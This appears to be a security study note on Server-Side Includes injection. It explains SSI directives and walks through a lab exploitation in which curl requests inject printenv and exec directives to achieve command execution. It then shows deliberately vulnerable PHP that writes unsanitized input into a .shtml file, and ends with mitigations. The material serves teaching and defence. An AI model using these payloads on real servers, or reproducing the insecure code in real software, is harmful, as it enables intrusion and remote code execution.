### Content

- [Overview](#overview)
	- [SSI](#ssi)
- [Exploitation](#exploitation)
- [Vulnerable Code](#vulnerable-code)
- [Mitigation](#mitigation)

---
### Overview

**Server-Side Includes injection** occurs when an attacker can inject SSI directives into a file that is subsequently served by the web server, resulting in the execution of the injected SSI directives. That may happen due to many reasons, but for instance:

- The web app contains a vulnerable file upload vulnerability that enables an attacker to upload a file containing malicious SSI directives into the web root directory.
- If attackers might be able to inject SSI directives if a web application writes user input to a file in the web root directory.

#### SSI

- **Server-Side Includes** (SSI) is a simple server-side scripting language used to inject dynamic content into HTML pages before they are delivered to a user's browser.
- Useful for including the contents of one or more files into a web page on a web server (see below), using its `#include` directive. This could commonly be a common piece of code throughout a site, such as a page header, a page footer and a navigation menu.
- SSI also contains control directives for conditional features and directives for calling external programs.
- Supported by `Apache`, `LiteSpeed`, `nginx`, `IIS` and more webservers.

In order for a web server to recognize an SSI-enabled HTML file and therefore carry out these instructions, either the filename should end with a special extension, by default `.shtml`, `.stm`, `.shtm`, or, if the server is configured to allow this, set the execution bit of the file.

SSI Directives (`directive's name`, `one or more parameters`, `one or more parameter values`) example:

```ssi
<!--#name param1="value1" param2="value" -->
```

Some common SSI directives:

```java
// Prints environment variables
<!--#printenv -->

// Changes the SSI configuration (changing the error message)
<!--#config errmsg="Error!" -->

// Prints the value of any variable given in the var parameters
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->

// Executes commands
<!--#exec cmd="whoami" -->

// Includes the file specified in the virtual parameter
// It only allows for the inclusion of files in the web root directory.
<!--#include virtual="index.html" -->
```

---
### Exploitation

Suppose we sent the following request:

```http
GET /index.php?msg=name HTTP/1.1
Host: 154.57.164.77:30864
```

And got the following response which is a redirection to `page.shtml`, the extension is an indicator to SSI script existence:

```http
HTTP/1.1 302 Found
Date: Tue, 28 Apr 2026 04:43:09 GMT
Server: Apache/2.4.59 (Debian)
Location: page.shtml
[SNIP]
```

Trying to following the redirection and sending a directive to print environment vars :

```bash
$ curl -s 'http://<IP:PORT>/index.php' --data-urlencode 'msg=<!--#printenv -->' -L -G | grep PATH
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

We can also achieve a RCE:

```bash
$ curl -s 'http://<IP:PORT>/index.php' --data-urlencode 'msg=<!--#exec cmd="id" -->' -L -G  | grep uid
Hi uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
### Vulnerable Code

```PHP
<?php
ob_start();
include("header.txt");

if (isset($_GET['msg'])) {
	
	// Creates or overwrites page.shtml on every request
    $file = fopen("page.shtml", "w") or die("Unable to open file!");

    fwrite($file, '[...SNIP HTML header/logo/styles...]');
	
	// Unsanitized user input written directly into .shtml file
    fwrite($file, "Hi " . $_GET['msg'] . "!<br/>");
    fwrite($file, "<br/>Your IP: 41.44.223.191<br/>");
    fwrite($file, "<br/>Current Time: Tuesday, 28-Apr-2026 04:59:41 UTC<br/>");

    fwrite($file, '[...SNIP HTML waves/footer...]');

    fclose($file);
    // Redirects to .shtml → Apache will parse SSI directives in the file
    header("Location: page.shtml");
}?>
```

---
### Mitigation

- Validate and sanitize user input to prevent SSI injection.
	- Important when user input is used within SSI directives or written to files that may contain SSI directives according to the web server configuration.
- Configure the web server to restrict the use of SSI to particular file extensions and potentially even particular directories.
- Limit the capabilities of specific SSI directives to mitigate the impact of SSI injection vulnerabilities.
	- For instance, it may be possible to disable the `exec` directive if it is not actively required.
